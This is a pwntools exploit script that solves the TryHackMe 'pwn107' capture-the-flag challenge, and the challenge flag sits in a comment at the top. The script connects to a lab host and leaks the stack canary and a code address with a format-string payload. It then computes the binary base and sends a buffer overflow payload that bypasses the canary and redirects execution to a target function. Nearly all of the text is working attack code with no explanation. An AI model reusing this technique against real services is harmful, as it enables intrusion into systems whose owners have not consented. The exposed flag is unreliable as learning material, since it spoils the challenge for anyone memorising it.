#THM{whY_i_us3d_pr1ntF()_w1thoUt_fmting??}
from pwn import *

host  = '10.10.173.60' 
port = 9007
exe = 'pwn107-1644307530397.pwn107'
elf = ELF(exe)
rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]
context.binary = elf
context.log_level = "debug"
p = remote(host, port)

# p = process(exe)

fmt_string = b"%13$p %19$p" # locally it's 13 and 17

p.recvuntil(b"THM: What\'s your last streak? ")
p.sendline(fmt_string)
p.recvuntil(b"Your current streak: 0x")
canary = p.recvuntil(b"0x").split(b" ")[0].decode()
main = p.recvline().strip(b'\n').decode()
print(canary, int(main,16))

#calculate get streak address
offset_to_get_streak = elf.symbols['get_streak']
offset_to_get_main = elf.symbols['main']
binary_base_address = int(main,16) - offset_to_get_main
get_streak_address = binary_base_address + offset_to_get_streak

p.recvline()

#construct payload
payload = b"A" * 24 + p64(int(canary,16)) + b"A" * 8 + p64(ret+binary_base_address) +  p64(get_streak_address) 
p.send(payload)
p.interactive()